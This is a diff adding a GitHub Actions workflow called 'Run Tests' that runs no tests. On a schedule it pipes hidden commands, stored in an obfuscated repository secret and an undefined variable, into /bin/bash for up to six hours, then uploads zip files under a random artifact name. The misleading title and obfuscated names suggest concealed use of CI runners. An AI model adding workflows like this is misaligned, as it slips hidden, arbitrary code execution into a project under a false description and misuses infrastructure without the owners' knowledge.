@@ -1,0 +1,31 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '20 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          hix467: ${{ secrets.hix467 }}
+        run: |
+          printf '%s' "$hix467" | jq -r .v48584 | /bin/bash
+          echo $tok801 | jq -r .ofob885 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: PoKWtjcB
+          path: "*.zip"
+          retention-days: 1
